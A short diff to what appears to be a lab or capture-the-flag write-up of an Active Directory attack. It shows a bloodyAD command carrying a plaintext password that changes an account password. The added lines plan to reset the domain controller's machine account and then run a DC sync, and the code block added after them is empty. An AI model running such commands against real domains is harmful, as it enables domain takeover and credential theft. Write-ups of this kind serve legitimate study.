@@ -302,4 +302,10 @@ bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -p '5rtfgvb%RT
 [+] Password changed successfully!
 ```
 
-Ill change the password using bloodyAD
+Ill change the password using bloodyAD of the DC machine account
+
+From here i can perform a DC sync
+
+```python
+
+```
